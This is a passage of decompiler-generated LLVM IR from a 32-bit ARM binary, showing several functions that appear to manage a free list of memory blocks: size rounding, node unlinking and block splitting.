  %v3_fe60 = inttoptr i32 %v2_fe60 to i32*
  %v4_fe60 = load i32, i32* %v3_fe60, align 4
  %v3_fe64 = add i32 %v3_fe58, 8
  %v4_fe64 = inttoptr i32 %v3_fe64 to i32*
  store i32 %v4_fe60, i32* %v4_fe64, align 4
  %v0_fe68.pre = load i32, i32* @r4, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_fe58, %bb12
  %v0_fe68 = phi i32 [ %v1_fe60, %dec_label_pc_fe58 ], [ %v0_fe68.pre, %bb12 ]
  %v1_fe68 = add i32 %v0_fe68, 8
  %v2_fe68 = inttoptr i32 %v1_fe68 to i32*
  %v3_fe68 = load i32, i32* %v2_fe68, align 4
  %v1_fe6c = add i32 %v0_fe68, 4
  %v2_fe6c = inttoptr i32 %v1_fe6c to i32*
  %v3_fe6c = load i32, i32* %v2_fe6c, align 4
  %v2_fe70 = icmp eq i32 %v3_fe68, 0
  br i1 %v2_fe70, label %.thread1, label %bb13

bb13:                                             ; preds = %.thread
  %v3_fe74 = add i32 %v3_fe68, 4
  %v4_fe74 = inttoptr i32 %v3_fe74 to i32*
  store i32 %v3_fe6c, i32* %v4_fe74, align 4
  br label %bb14

.thread1:                                         ; preds = %.thread
  %v2_fe78 = load i32, i32* %r8.global-to-local, align 4
  %v3_fe78 = inttoptr i32 %v2_fe78 to i32*
  store i32 %v3_fe6c, i32* %v3_fe78, align 4
  br label %bb14

bb14:                                             ; preds = %bb13, %.thread1
  %v1_fe88 = call i32 @function_10d4c()
  %v0_fe8c = load i32, i32* %r6.global-to-local, align 4
  %v1_fe8c = load i32, i32* @r4, align 4
  %v0_fe94 = load i32, i32* @r5, align 4
  %v2_fe8c = sub i32 12, %v0_fe8c
  %v1_fe90 = add i32 %v2_fe8c, %v1_fe8c
  %v2_fe94 = sub i32 %v1_fe90, %v0_fe94
  %v1_fe98 = call i32 @function_1143c(i32 %v2_fe94)
  br label %dec_label_pc_fe50

; uselistorder directives
  uselistorder i32 %v0_fe68, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 0 }
  uselistorder i32 (i32)* @function_1143c, { 1, 0, 2 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_fe58, { 1, 0 }
  uselistorder label %dec_label_pc_fe50, { 2, 1, 0 }
}

define i32 @function_febc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_febc:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_febc = load i32, i32* @r4, align 4
  store i32 %v3_febc, i32* %stack_var_-24, align 4
  %v6_febc = load i32, i32* @r5, align 4
  %v9_febc = load i32, i32* @r6, align 4
  %v12_febc = load i32, i32* @r7, align 4
  %v15_febc = load i32, i32* @r8, align 4
  %v18_febc = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r4, align 4
  %v2_fec0 = icmp eq i32 %arg2, 0
  %v0_fec4 = load i32, i32* @r0, align 4
  store i32 %v0_fec4, i32* @r7, align 4
  br i1 %v2_fec0, label %dec_label_pc_fecc, label %dec_label_pc_fed4

dec_label_pc_fecc:                                ; preds = %dec_label_pc_febc
  %v0_fecc = call i32 @function_fdcc()
  %v0_fedc.pre = load i32, i32* @r4, align 4
  %v2_fee0.pre = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_fedc

dec_label_pc_fed4:                                ; preds = %dec_label_pc_febc
  %v2_fed4 = icmp eq i32 %v0_fec4, 0
  br i1 %v2_fed4, label %dec_label_pc_fedc, label %dec_label_pc_fee8

dec_label_pc_fedc:                                ; preds = %dec_label_pc_fed4, %dec_label_pc_fecc
  %v2_fee0 = phi i32 [ %v3_febc, %dec_label_pc_fed4 ], [ %v2_fee0.pre, %dec_label_pc_fecc ]
  %v0_fedc = phi i32 [ %arg2, %dec_label_pc_fed4 ], [ %v0_fedc.pre, %dec_label_pc_fecc ]
  store i32 %v2_fee0, i32* @r4, align 4
  store i32 %v6_febc, i32* @r5, align 4
  store i32 %v9_febc, i32* @r6, align 4
  store i32 %v12_febc, i32* @r7, align 4
  store i32 %v18_febc, i32* @lr, align 4
  %v1_fee4 = call i32 @function_fc78(i32 %v0_fedc)
  %v0_fee8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_fee8

dec_label_pc_fee8:                                ; preds = %dec_label_pc_fed4, %dec_label_pc_fedc
  %v0_ff00 = phi i32 [ %v0_fec4, %dec_label_pc_fed4 ], [ %v1_fee4, %dec_label_pc_fedc ]
  %v0_fee8 = phi i32 [ %arg2, %dec_label_pc_fed4 ], [ %v0_fee8.pre, %dec_label_pc_fedc ]
  %v1_fee8 = add i32 %v0_fee8, 7
  %v1_feec = and i32 %v1_fee8, -4
  store i32 %v1_feec, i32* @r5, align 4
  %v2_fef0 = icmp ugt i32 %v1_feec, 10
  %v1_fef4 = add i32 %v0_ff00, -4
  %v2_fef4 = inttoptr i32 %v1_fef4 to i32*
  %v3_fef4 = load i32, i32* %v2_fef4, align 4
  store i32 %v3_fef4, i32* @r6, align 4
  br i1 %v2_fef0, label %bb14, label %bb

bb:                                               ; preds = %dec_label_pc_fee8
  store i32 12, i32* @r5, align 4
  br label %bb14

bb14:                                             ; preds = %dec_label_pc_fee8, %bb
  %v0_ff7c = phi i32 [ %v1_feec, %dec_label_pc_fee8 ], [ 12, %bb ]
  store i32 %v1_fef4, i32* @r8, align 4
  %tmp = icmp ugt i32 %v0_ff7c, %v3_fef4
  br i1 %tmp, label %dec_label_pc_ff08, label %dec_label_pc_ff7c

dec_label_pc_ff08:                                ; preds = %bb14
  %v2_fefc = sub i32 %v0_ff7c, %v3_fef4
  %v1_ff18 = call i32 @function_10d4c()
  %v0_ff20 = load i32, i32* @r8, align 4
  %v1_ff20 = load i32, i32* @r6, align 4
  %v2_ff20 = add i32 %v1_ff20, %v0_ff20
  %v4_ff28 = call i32 @function_10068(i32* bitcast (i32** @global_var_203fc.444 to i32*), i32 %v2_ff20, i32 %v2_fefc)
  store i32 %v4_ff28, i32* @r4, align 4
  store i32 65344, i32* @lr, align 4
  %v1_ff3c = call i32 @function_10d4c()
  %v0_ff40 = load i32, i32* @r4, align 4
  %v2_ff40 = icmp eq i32 %v0_ff40, 0
  br i1 %v2_ff40, label %dec_label_pc_ff50, label %.thread

.thread:                                          ; preds = %dec_label_pc_ff08
  %v1_ff44 = load i32, i32* @r6, align 4
  %v3_ff44 = add i32 %v1_ff44, %v0_ff40
  %v2_ff48 = load i32, i32* @r7, align 4
  %v3_ff48 = add i32 %v2_ff48, -4
  %v4_ff48 = inttoptr i32 %v3_ff48 to i32*
  store i32 %v3_ff44, i32* %v4_ff48, align 4
  br label %dec_label_pc_ffbc

dec_label_pc_ff50:                                ; preds = %dec_label_pc_ff08
  %v0_ff50 = load i32, i32* @r5, align 4
  %v1_ff50 = add i32 %v0_ff50, -4
  %v1_ff54 = call i32 @function_fc78(i32 %v1_ff50)
  store i32 %v1_ff54, i32* @r0, align 4
  store i32 %v1_ff54, i32* @r4, align 4
  %v2_ff58 = icmp eq i32 %v1_ff54, 0
  br i1 %v2_ff58, label %dec_label_pc_ff74, label %dec_label_pc_ff60

dec_label_pc_ff60:                                ; preds = %dec_label_pc_ff50
  %v0_ff60 = load i32, i32* @r6, align 4
  %v1_ff60 = add i32 %v0_ff60, -4
  store i32 %v1_ff60, i32* @r2, align 4
  %v0_ff64 = load i32, i32* @r7, align 4
  store i32 %v0_ff64, i32* @r1, align 4
  %v0_ff68 = call i32 @function_ef60()
  %v0_ff6c = load i32, i32* @r7, align 4
  store i32 %v0_ff6c, i32* @r0, align 4
  %v0_ff70 = call i32 @function_fdcc()
  %v0_ff74.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ff74

dec_label_pc_ff74:                                ; preds = %dec_label_pc_ff50, %dec_label_pc_ff60
  %v0_ff74 = phi i32 [ 0, %dec_label_pc_ff50 ], [ %v0_ff74.pre, %dec_label_pc_ff60 ]
  store i32 %v0_ff74, i32* @r7, align 4
  br label %dec_label_pc_ffbc

dec_label_pc_ff7c:                                ; preds = %bb14
  %v1_ff7c = add i32 %v0_ff7c, 28
  %tmp15 = icmp ugt i32 %v1_ff7c, %v3_fef4
  br i1 %tmp15, label %dec_label_pc_ffbc, label %dec_label_pc_ff88

dec_label_pc_ff88:                                ; preds = %dec_label_pc_ff7c
  %v1_ff94 = call i32 @function_10d4c()
  %v0_ff98 = load i32, i32* @r8, align 4
  %v1_ff98 = load i32, i32* @r5, align 4
  %v2_ff98 = add i32 %v1_ff98, %v0_ff98
  %v1_ff9c = load i32, i32* @r6, align 4
  %v2_ff9c = sub i32 %v1_ff9c, %v1_ff98
  %v4_ffa4 = call i32 @function_10128(i32* bitcast (i32** @global_var_203fc.444 to i32*), i32 %v2_ff98, i32 %v2_ff9c)
  store i32 65464, i32* @lr, align 4
  %v1_ffb4 = call i32 @function_10d4c()
  %v0_ffb8 = load i32, i32* @r5, align 4
  %v1_ffb8 = load i32, i32* @r7, align 4
  %v2_ffb8 = add i32 %v1_ffb8, -4
  %v3_ffb8 = inttoptr i32 %v2_ffb8 to i32*
  store i32 %v0_ffb8, i32* %v3_ffb8, align 4
  br label %dec_label_pc_ffbc

dec_label_pc_ffbc:                                ; preds = %.thread, %dec_label_pc_ff7c, %dec_label_pc_ff74, %dec_label_pc_ff88
  %v0_ffbc = load i32, i32* @r7, align 4
  store i32 %v9_febc, i32* @r6, align 4
  store i32 %v15_febc, i32* @r8, align 4
  ret i32 %v0_ffbc

; uselistorder directives
  uselistorder i32 %v1_ff98, { 1, 0 }
  uselistorder i32 %v0_ff7c, { 1, 2, 0 }
  uselistorder i32 %v3_fef4, { 0, 2, 1, 3 }
  uselistorder i32** @global_var_203fc.444, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_203fc.444 to i32*), { 1, 2, 0, 3, 4, 5 }
  uselistorder label %dec_label_pc_ffbc, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_ff74, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %dec_label_pc_fee8, { 1, 0 }
}

define i32 @function_ffd4(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_ffd4:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v1_ffd4 = inttoptr i32 %arg2 to i32*
  %v2_ffd4 = load i32, i32* %v1_ffd4, align 4
  %v3_ffd8 = load i32, i32* @r4, align 4
  store i32 %v3_ffd8, i32* %stack_var_-8, align 4
  %v1_ffdc = add i32 %v2_ffd4, 3
  %v1_ffe0 = and i32 %v1_ffdc, -4
  store i32 %v1_ffe0, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_ffe8 = icmp ugt i32 %v1_ffe0, 10
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_fff0 = load i32, i32* %arg1, align 4
  store i32 %v2_fff0, i32* %r0.global-to-local, align 4
  br i1 %v2_ffe8, label %dec_label_pc_1005c.preheader, label %bb

bb:                                               ; preds = %dec_label_pc_ffd4
  store i32 12, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1005c.preheader

dec_label_pc_1005c.preheader:                     ; preds = %dec_label_pc_ffd4, %bb
  %v1_10010 = phi i32 [ %v1_ffe0, %dec_label_pc_ffd4 ], [ 12, %bb ]
  %v2_1005c9 = icmp eq i32 %v2_fff0, 0
  br i1 %v2_1005c9, label %dec_label_pc_10064, label %dec_label_pc_fffc

dec_label_pc_fffc:                                ; preds = %dec_label_pc_1005c.preheader, %dec_label_pc_10058
  %v2_10014 = phi i32 [ %v3_10058, %dec_label_pc_10058 ], [ %v2_fff0, %dec_label_pc_1005c.preheader ]
  %v1_fffc = inttoptr i32 %v2_10014 to i32*
  %v2_fffc = load i32, i32* %v1_fffc, align 4
  store i32 %v2_fffc, i32* @ip, align 4
  %v3_10000 = icmp ult i32 %v2_fffc, %v1_10010
  br i1 %v3_10000, label %dec_label_pc_10058, label %dec_label_pc_10008

dec_label_pc_10008:                               ; preds = %dec_label_pc_fffc
  %v1_10008 = add i32 %v1_10010, 44
  %v3_1000c = icmp ult i32 %v2_fffc, %v1_10008
  br i1 %v3_1000c, label %dec_label_pc_1001c, label %.thread._crit_edge

.thread._crit_edge:                               ; preds = %dec_label_pc_10008
  %v2_10000.le = sub i32 %v2_fffc, %v1_10010
  store i32 %v2_10000.le, i32* %v1_fffc, align 4
  %v0_10048.pre = load i32, i32* @ip, align 4
  %v0_10050.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb29

dec_label_pc_1001c:                               ; preds = %dec_label_pc_10008
  %v1_1001c = add i32 %v2_10014, 4
  %v2_1001c = inttoptr i32 %v1_1001c to i32*
  %v3_1001c = load i32, i32* %v2_1001c, align 4
  store i32 %v3_1001c, i32* %r2.global-to-local, align 4
  %v2_10020 = icmp eq i32 %v3_1001c, 0
  br i1 %v2_10020, label %.thread2, label %bb27

bb27:                                             ; preds = %dec_label_pc_1001c
  %v2_10024 = add i32 %v2_10014, 8
  %v3_10024 = inttoptr i32 %v2_10024 to i32*
  %v4_10024 = load i32, i32* %v3_10024, align 4
  %v3_10028 = add i32 %v3_1001c, 8
  %v4_10028 = inttoptr i32 %v3_10028 to i32*
  store i32 %v4_10024, i32* %v4_10028, align 4
  %v0_1002c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1001c, %bb27
  %v0_1002c = phi i32 [ %v2_10014, %dec_label_pc_1001c ], [ %v0_1002c.pre, %bb27 ]
  %v1_1002c = add i32 %v0_1002c, 8
  %v2_1002c = inttoptr i32 %v1_1002c to i32*
  %v3_1002c = load i32, i32* %v2_1002c, align 4
  %v1_10030 = add i32 %v0_1002c, 4
  %v2_10030 = inttoptr i32 %v1_10030 to i32*
  %v3_10030 = load i32, i32* %v2_10030, align 4
  %v2_10034 = icmp eq i32 %v3_1002c, 0
  br i1 %v2_10034, label %.thread5, label %bb28

bb28:                                             ; preds = %.thread2
  %v3_10038 = add i32 %v3_1002c, 4
  %v4_10038 = inttoptr i32 %v3_10038 to i32*
  store i32 %v3_10030, i32* %v4_10038, align 4
  %v1_10040 = load i32, i32* @ip, align 4
  store i32 %v1_10040, i32* %r2.global-to-local, align 4
  br label %bb29

.thread5:                                         ; preds = %.thread2
  %v2_1003c = load i32, i32* %r1.global-to-local, align 4
  %v3_1003c = inttoptr i32 %v2_1003c to i32*
  store i32 %v3_10030, i32* %v3_1003c, align 4
  %v1_10044.pre = load i32, i32* @ip, align 4
  store i32 %v1_10044.pre, i32* %r2.global-to-local, align 4
  br label %bb29

bb29:                                             ; preds = %bb28, %.thread._crit_edge, %.thread5
  %v0_10050 = phi i32 [ %v0_10050.pre, %.thread._crit_edge ], [ %v1_10040, %bb28 ], [ %v1_10044.pre, %.thread5 ]
  %v0_10048 = phi i32 [ %v0_10048.pre, %.thread._crit_edge ], [ %v1_10040, %bb28 ], [ %v1_10044.pre, %.thread5 ]
  %v1_10048 = load i32, i32* %r0.global-to-local, align 4
  %v2_10048 = sub i32 %v1_10048, %v0_10048
  %v1_1004c = add i32 %v2_10048, 12
  store i32 %v1_1004c, i32* %r0.global-to-local, align 4
  %v1_10050 = load i32, i32* %r4.global-to-local, align 4
  %v2_10050 = inttoptr i32 %v1_10050 to i32*
  store i32 %v0_10050, i32* %v2_10050, align 4
  %v2_10054 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10054, i32* %r4.global-to-local, align 4
  ret i32 %v1_1004c

dec_label_pc_10058:                               ; preds = %dec_label_pc_fffc
  %v1_10058 = add i32 %v2_10014, 4
  %v2_10058 = inttoptr i32 %v1_10058 to i32*
  %v3_10058 = load i32, i32* %v2_10058, align 4
  store i32 %v3_10058, i32* %r0.global-to-local, align 4
  %v2_1005c = icmp eq i32 %v3_10058, 0
  br i1 %v2_1005c, label %dec_label_pc_1005c.dec_label_pc_10064_crit_edge, label %dec_label_pc_fffc

dec_label_pc_1005c.dec_label_pc_10064_crit_edge:  ; preds = %dec_label_pc_10058
  br label %dec_label_pc_10064

dec_label_pc_10064:                               ; preds = %dec_label_pc_1005c.dec_label_pc_10064_crit_edge, %dec_label_pc_1005c.preheader
  store i32 %v3_ffd8, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_10058, { 1, 2, 0 }
  uselistorder i32 %v0_1002c, { 1, 0 }
  uselistorder i32 %v2_fffc, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10014, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_10010, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 5, 0 }
  uselistorder label %bb29, { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_fffc, { 1, 0 }
  uselistorder label %dec_label_pc_1005c.preheader, { 1, 0 }
}

define i32 @function_10068(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10068:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_1006c = load i32, i32* %arg1, align 4
  store i32 %v2_1006c, i32* @ip, align 4
  store i32 %tmp, i32* %lr.global-to-local, align 4
  %v2_100e46 = icmp eq i32 %v2_1006c, 0
  br i1 %v2_100e46, label %dec_label_pc_100ec, label %dec_label_pc_10078

dec_label_pc_10078:                               ; preds = %dec_label_pc_10068, %dec_label_pc_100e0
  %v0_100b8 = phi i32 [ %v3_100e0, %dec_label_pc_100e0 ], [ %v2_1006c, %dec_label_pc_10068 ]
  %v1_10078 = inttoptr i32 %v0_100b8 to i32*
  %v2_10078 = load i32, i32* %v1_10078, align 4
  store i32 %v2_10078, i32* %r0.global-to-local, align 4
  %v2_1007c = sub i32 %v0_100b8, %v2_10078
  %v1_10080 = add i32 %v2_1007c, 12
  %v3_10084 = icmp uge i32 %v1_10080, %arg2
  %v9_10084 = icmp eq i32 %v1_10080, %arg2
  %v2_10088 = xor i1 %v9_10084, true
  %v3_10088 = and i1 %v3_10084, %v2_10088
  br i1 %v3_10088, label %dec_label_pc_100e0, label %dec_label_pc_1008c

dec_label_pc_1008c:                               ; preds = %dec_label_pc_10078
  br i1 %v9_10084, label %dec_label_pc_10090, label %dec_label_pc_100ec

dec_label_pc_10090:                               ; preds = %dec_label_pc_1008c
  %v1_10090 = add i32 %arg3, 3
  %v1_10094 = and i32 %v1_10090, -4
  store i32 %v1_10094, i32* %r2.global-to-local, align 4
  %v2_10098 = sub i32 %v2_10078, %v1_10094
  %v3_10098 = icmp ult i32 %v2_10078, %v1_10094
  br i1 %v3_10098, label %dec_label_pc_100ec, label %dec_label_pc_100a0

dec_label_pc_100a0:                               ; preds = %dec_label_pc_10090
  %v1_100a0 = add i32 %v1_10094, 44
  %v3_100a4 = icmp ult i32 %v2_10078, %v1_100a0
  br i1 %v3_100a4, label %.thread2, label %bb

bb:                                               ; preds = %dec_label_pc_100a0
  store i32 %v2_10098, i32* %v1_10078, align 4
  %v1_100b0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_100b0, i32* %r0.global-to-local, align 4
  ret i32 %v1_100b0

.thread2:                                         ; preds = %dec_label_pc_100a0
  %v1_100b8 = add i32 %v0_100b8, 4
  %v2_100b8 = inttoptr i32 %v1_100b8 to i32*
  %v3_100b8 = load i32, i32* %v2_100b8, align 4
  store i32 %v3_100b8, i32* %r2.global-to-local, align 4
  %v2_100bc = icmp eq i32 %v3_100b8, 0
  br i1 %v2_100bc, label %.thread3, label %bb17

bb17:                                             ; preds = %.thread2
  %v2_100c0 = add i32 %v0_100b8, 8
  %v3_100c0 = inttoptr i32 %v2_100c0 to i32*
  %v4_100c0 = load i32, i32* %v3_100c0, align 4
  %v3_100c4 = add i32 %v3_100b8, 8
  %v4_100c4 = inttoptr i32 %v3_100c4 to i32*
  store i32 %v4_100c0, i32* %v4_100c4, align 4
  %v0_100c8.pre = load i32, i32* @ip, align 4
  br label %.thread3

.thread3:                                         ; preds = %.thread2, %bb17
  %v0_100c8 = phi i32 [ %v0_100b8, %.thread2 ], [ %v0_100c8.pre, %bb17 ]
  %v1_100c8 = add i32 %v0_100c8, 8
  %v2_100c8 = inttoptr i32 %v1_100c8 to i32*
  %v3_100c8 = load i32, i32* %v2_100c8, align 4
  store i32 %v3_100c8, i32* %r2.global-to-local, align 4
  %v1_100cc = add i32 %v0_100c8, 4
  %v2_100cc = inttoptr i32 %v1_100cc to i32*
  %v3_100cc = load i32, i32* %v2_100cc, align 4
  %v2_100d0 = icmp eq i32 %v3_100c8, 0
  br i1 %v2_100d0, label %.thread4, label %bb18

bb18:                                             ; preds = %.thread3
  %v3_100d4 = add i32 %v3_100c8, 4
  %v4_100d4 = inttoptr i32 %v3_100d4 to i32*
  store i32 %v3_100cc, i32* %v4_100d4, align 4
  br label %bb19

.thread4:                                         ; preds = %.thread3
  %v2_100d8 = load i32, i32* %lr.global-to-local, align 4
  %v3_100d8 = inttoptr i32 %v2_100d8 to i32*
  store i32 %v3_100cc, i32* %v3_100d8, align 4
  br label %bb19

bb19:                                             ; preds = %bb18, %.thread4
  %v5_100dc = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v5_100dc

dec_label_pc_100e0:                               ; preds = %dec_label_pc_10078
  %v1_100e0 = add i32 %v0_100b8, 4
  %v2_100e0 = inttoptr i32 %v1_100e0 to i32*
  %v3_100e0 = load i32, i32* %v2_100e0, align 4
  store i32 %v3_100e0, i32* @ip, align 4
  %v2_100e4 = icmp eq i32 %v3_100e0, 0
  br i1 %v2_100e4, label %dec_label_pc_100e4.dec_label_pc_100ec.loopexit_crit_edge, label %dec_label_pc_10078

dec_label_pc_100e4.dec_label_pc_100ec.loopexit_crit_edge: ; preds = %dec_label_pc_100e0
  br label %dec_label_pc_100ec

dec_label_pc_100ec:                               ; preds = %dec_label_pc_10090, %dec_label_pc_10068, %dec_label_pc_100e4.dec_label_pc_100ec.loopexit_crit_edge, %dec_label_pc_1008c
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_100e0, { 1, 2, 0 }
  uselistorder i32 %v0_100c8, { 1, 0 }
  uselistorder i32 %v1_10094, { 0, 2, 1, 3 }
  uselistorder i1 %v9_10084, { 1, 0 }
  uselistorder i32 %v2_10078, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_100b8, { 3, 2, 1, 0, 5, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 0 }
  uselistorder label %dec_label_pc_100ec, { 2, 0, 3, 1 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_10078, { 1, 0 }
}

define i32 @function_100f4() local_unnamed_addr {
dec_label_pc_100f4:
  %v0_100f4 = load i32, i32* @r2, align 4
  %v2_100f4 = icmp eq i32 %v0_100f4, 0
  %v0_100f8 = load i32, i32* @r3, align 4
  %v1_100f8 = load i32, i32* @r1, align 4
  %v2_100f8 = add i32 %v1_100f8, 4
  %v3_100f8 = inttoptr i32 %v2_100f8 to i32*
  store i32 %v0_100f8, i32* %v3_100f8, align 4
  %v0_100fc = load i32, i32* @r2, align 4
  %v1_100fc = load i32, i32* @r1, align 4
  %v2_100fc = add i32 %v1_100fc, 8
  %v3_100fc = inttoptr i32 %v2_100fc to i32*
  store i32 %v0_100fc, i32* %v3_100fc, align 4
  %v1_10104 = load i32, i32* @r1, align 4
  br i1 %v2_100f4, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_100f4
  %v2_10100 = load i32, i32* @r2, align 4
  %v3_10100 = add i32 %v2_10100, 4
  %v4_10100 = inttoptr i32 %v3_10100 to i32*
  store i32 %v1_10104, i32* %v4_10100, align 4
  br label %bb1

.thread:                                          ; preds = %dec_label_pc_100f4
  %v2_10104 = load i32, i32* @r0, align 4
  %v3_10104 = inttoptr i32 %v2_10104 to i32*
  store i32 %v1_10104, i32* %v3_10104, align 4
  br label %bb1

bb1:                                              ; preds = %bb, %.thread
  %v0_10108 = load i32, i32* @r3, align 4
  %v2_10108 = icmp eq i32 %v0_10108, 0
  br i1 %v2_10108, label %bb3, label %bb2

bb2:                                              ; preds = %bb1
  %v1_1010c = load i32, i32* @r1, align 4
  %v3_1010c = add i32 %v0_10108, 8
  %v4_1010c = inttoptr i32 %v3_1010c to i32*
  store i32 %v1_1010c, i32* %v4_1010c, align 4
  br label %bb3

bb3:                                              ; preds = %bb1, %bb2
  %v1_10110 = load i32, i32* @r0, align 4
  ret i32 %v1_10110

; uselistorder directives
  uselistorder i32 %v1_10104, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_10114() local_unnamed_addr {
dec_label_pc_10114:
  %v0_10114 = load i32, i32* @r2, align 4
  %v2_10114 = icmp eq i32 %v0_10114, 0
  %v1_10118 = load i32, i32* @r1, align 4
  br i1 %v2_10114, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_10114
  %v2_10118 = load i32, i32* @r0, align 4
  %v3_10118 = inttoptr i32 %v2_10118 to i32*
  store i32 %v1_10118, i32* %v3_10118, align 4
  br label %bb2

.thread:                                          ; preds = %dec_label_pc_10114
  %v3_1011c = add i32 %v0_10114, 4
  %v4_1011c = inttoptr i32 %v3_1011c to i32*
  store i32 %v1_10118, i32* %v4_1011c, align 4
  br label %bb2

bb2:                                              ; preds = %bb, %.thread
  %v0_10120 = load i32, i32* @r2, align 4
  %v1_10120 = load i32, i32* @r1, align 4
  %v2_10120 = add i32 %v1_10120, 8
  %v3_10120 = inttoptr i32 %v2_10120 to i32*
  store i32 %v0_10120, i32* %v3_10120, align 4
  %v1_10124 = load i32, i32* @r0, align 4
  ret i32 %v1_10124

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_10128(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10128:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_10128 = load i32, i32* @r4, align 4
  store i32 %v3_10128, i32* %stack_var_-20, align 4
  %v2_1012c = load i32, i32* %arg1, align 4
  store i32 %v2_1012c, i32* %r4.global-to-local, align 4
  %v2_10130 = add i32 %arg3, %arg2
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_1014c2 = icmp eq i32 %v2_1012c, 0
  br i1 %v2_1014c2, label %dec_label_pc_101fc, label %dec_label_pc_1013c

dec_label_pc_1013c:                               ; preds = %dec_label_pc_10128, %dec_label_pc_10144
  %v0_1018c = phi i32 [ %v0_10194, %dec_label_pc_10144 ], [ 0, %dec_label_pc_10128 ]
  %v0_10194 = phi i32 [ %v3_10148, %dec_label_pc_10144 ], [ %v2_1012c, %dec_label_pc_10128 ]
  %v1_101505.in = phi i32 [ %v3_10148, %dec_label_pc_10144 ], [ %v2_1012c, %dec_label_pc_10128 ]
  %v1_101505 = add i32 %v1_101505.in, 12
  %v3_1013c = icmp ult i32 %v1_101505, %arg2
  br i1 %v3_1013c, label %dec_label_pc_10144, label %dec_label_pc_1015c

dec_label_pc_10144:                               ; preds = %dec_label_pc_1013c
  store i32 %v0_10194, i32* %r6.global-to-local, align 4
  %v1_10148 = add i32 %v0_10194, 4
  %v2_10148 = inttoptr i32 %v1_10148 to i32*
  %v3_10148 = load i32, i32* %v2_10148, align 4
  store i32 %v3_10148, i32* %r4.global-to-local, align 4
  %v2_1014c = icmp eq i32 %v3_10148, 0
  br i1 %v2_1014c, label %dec_label_pc_1014c.dec_label_pc_101fc.loopexit_crit_edge, label %dec_label_pc_1013c

dec_label_pc_1015c:                               ; preds = %dec_label_pc_1013c
  %v1_1015c = inttoptr i32 %v0_10194 to i32*
  %v2_1015c = load i32, i32* %v1_1015c, align 4
  store i32 %v2_1015c, i32* @ip, align 4
  %v2_10160 = sub i32 %v0_10194, %v2_1015c
  %v1_10164 = add i32 %v2_10160, 12
  %v3_10168 = icmp uge i32 %v1_10164, %v2_10130
  %v9_10168 = icmp eq i32 %v1_10164, %v2_10130
  %v2_1016c = xor i1 %v9_10168, true
  %v3_1016c = and i1 %v3_10168, %v2_1016c
  br i1 %v3_1016c, label %dec_label_pc_101fc, label %dec_label_pc_10170

dec_label_pc_10170:                               ; preds = %dec_label_pc_1015c
  %v2_10170 = add i32 %v2_1015c, %arg3
  store i32 %v2_10170, i32* %r7.global-to-local, align 4
  br i1 %v9_10168, label %dec_label_pc_10178, label %dec_label_pc_101a4

dec_label_pc_10178:                               ; preds = %dec_label_pc_10170
  %v2_10178 = icmp eq i32 %v0_1018c, 0
